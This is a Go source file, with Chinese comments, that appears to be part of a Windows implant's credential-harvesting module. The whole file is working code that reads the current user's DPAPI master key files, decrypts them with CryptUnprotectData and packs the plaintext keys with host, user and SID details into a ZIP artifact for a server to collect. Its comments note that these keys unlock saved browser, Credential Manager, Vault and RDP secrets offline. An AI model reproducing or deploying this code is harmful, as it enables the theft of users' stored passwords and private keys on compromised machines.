//go:build windows

package services

import (
	"archive/zip"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"os"
	"path/filepath"
	"strings"
	"time"

	"golang.org/x/sys/windows"
	"implant/core/debuglog"
)

// DPAPI 主密钥采集（凭据模块族第二批 · 模块 2）。
//
// 取什么：`%APPDATA%\Microsoft\Protect\<SID>\` 下的用户主密钥文件。
// 每个文件就是一份 DPAPI masterkey blob，用当前用户作用域的
// CryptUnprotectData 可以直接解出明文 masterkey —— 拿到它之后，同一用户
// 的其他 DPAPI 保护数据（浏览器 Local State、Credential Manager、Vault、
// RDP 保存的凭据、EFS 证书私钥……）都能离线解开。
//
// 为什么不一起抓 Credentials/Vault：那些 blob 数量多、价值参差，
// 而"主密钥 + 目标 blob"才是通用解；本轮先给主密钥（体积小、价值密度最高）。
//
// 制品形态：ZIP（manifest.json + keys/<GUID>.json）。与服务端
// cred.ValidateZip 的校验口径一致（必须有 manifest.json、条目可完整读取）。
type dpapiKeyEntry struct {
	GUID      string `json:"guid"`
	MasterKey string `json:"masterkey"`
	File      string `json:"file"`
	Size      int64  `json:"size"`
}

type dpapiManifest struct {
	Host        string          `json:"host"`
	User        string          `json:"user"`
	SID         string          `json:"sid"`
	CollectedAt string          `json:"collected_at"`
	Tech        string          `json:"tech"`
	Keys        []dpapiKeyEntry `json:"keys"`
	Errors      []string        `json:"errors,omitempty"`
}

// collectDPAPIMasterKeys 采集当前用户的主密钥并打包成 ZIP，返回（制品路径, 密钥数）
func collectDPAPIMasterKeys(destPath string) (string, int, error) {
	sid, err := currentUserSID()
	if err != nil {
		return "", 0, err
	}
	protectDir := filepath.Join(os.Getenv("APPDATA"), "Microsoft", "Protect", sid)
	path, n, err := collectDPAPIMasterKeysIn(destPath, protectDir)
	return path, n, err
}

// collectDPAPIMasterKeysIn 指定主密钥目录的采集实现（目录可注入，便于在真实
// Windows 上覆盖"目录不存在/为空"等边界；正常路径总是取当前用户的 Protect\SID）
func collectDPAPIMasterKeysIn(destPath, protectDir string) (string, int, error) {
	sid, err := currentUserSID()
	if err != nil {
		return "", 0, err
	}
	entries, err := os.ReadDir(protectDir)
	if err != nil {
		return "", 0, fmt.Errorf("读取 DPAPI 主密钥目录失败（%s）: %w", protectDir, err)
	}

	man := dpapiManifest{
		Host: hostnameOrEmpty(), User: os.Getenv("USERNAME"), SID: sid,
		CollectedAt: time.Now().Format("2006-01-02 15:04:05"), Tech: "dpapi-masterkey",
	}
	if man.Host == "" {
		man.Host = "unknown"
	}

	type keyFile struct {
		name string
		data []byte
	}
	var keys []keyFile
	for _, e := range entries {
		if e.IsDir() {
			continue
		}
		name := e.Name()
		// Preferred 是"当前首选主密钥"的指针文件，BK-* 是备份：都不是密钥本体
		if strings.EqualFold(name, "Preferred") || strings.HasPrefix(strings.ToUpper(name), "BK-") {
			continue
		}
		full := filepath.Join(protectDir, name)
		raw, err := os.ReadFile(full)
		if err != nil {
			man.Errors = append(man.Errors, fmt.Sprintf("%s: 读取失败 %v", name, err))
			continue
		}
		plain, err := cryptUnprotect(raw)
		if err != nil {
			man.Errors = append(man.Errors, fmt.Sprintf("%s: DPAPI 解密失败 %v", name, err))
			continue
		}
		if len(plain) == 0 {
			man.Errors = append(man.Errors, fmt.Sprintf("%s: 解密结果为空", name))
			continue
		}
		guid := strings.ToUpper(strings.TrimSuffix(name, filepath.Ext(name)))
		entry := dpapiKeyEntry{
			GUID: guid, MasterKey: base64.StdEncoding.EncodeToString(plain),
			File: "keys/" + guid + ".json", Size: int64(len(plain)),
		}
		body, _ := json.MarshalIndent(entry, "", "  ")
		man.Keys = append(man.Keys, entry)
		keys = append(keys, keyFile{name: entry.File, data: body})
		debuglog.Printf("🔑 [DPAPI] 主密钥已解密: %s（%d 字节）\n", guid, len(plain))
	}
	if len(man.Keys) == 0 {
		return "", 0, fmt.Errorf("没有取到任何主密钥（目录 %s；错误 %v）", protectDir, man.Errors)
	}

	manifest, err := json.MarshalIndent(man, "", "  ")
	if err != nil {
		return "", 0, err
	}

	f, err := os.Create(destPath)
	if err != nil {
		return "", 0, fmt.Errorf("创建制品失败: %w", err)
	}
	zw := zip.NewWriter(f)
	writeEntry := func(name string, data []byte) error {
		w, err := zw.Create(name)
		if err != nil {
			return err
		}
		_, err = w.Write(data)
		return err
	}
	if err := writeEntry("manifest.json", manifest); err != nil {
		zw.Close()
		f.Close()
		_ = os.Remove(destPath)
		return "", 0, err
	}
	for _, k := range keys {
		if err := writeEntry(k.name, k.data); err != nil {
			zw.Close()
			f.Close()
			_ = os.Remove(destPath)
			return "", 0, err
		}
	}
	if err := zw.Close(); err != nil {
		f.Close()
		_ = os.Remove(destPath)
		return "", 0, err
	}
	if err := f.Close(); err != nil {
		_ = os.Remove(destPath)
		return "", 0, err
	}
	return destPath, len(man.Keys), nil
}

// currentUserSID 取当前用户的 SID（主密钥目录名就是它）
func currentUserSID() (string, error) {
	tok := windows.GetCurrentProcessToken()
	user, err := tok.GetTokenUser()
	if err != nil {
		return "", fmt.Errorf("取当前用户 SID 失败: %w", err)
	}
	if user == nil || user.User.Sid == nil {
		return "", fmt.Errorf("当前令牌没有用户 SID")
	}
	return user.User.Sid.String(), nil
}

// encodeB64 供 browser_windows.go 复用（避免两处各引一次 base64）
func encodeB64(b []byte) string { return base64.StdEncoding.EncodeToString(b) }

var _ = base64.StdEncoding
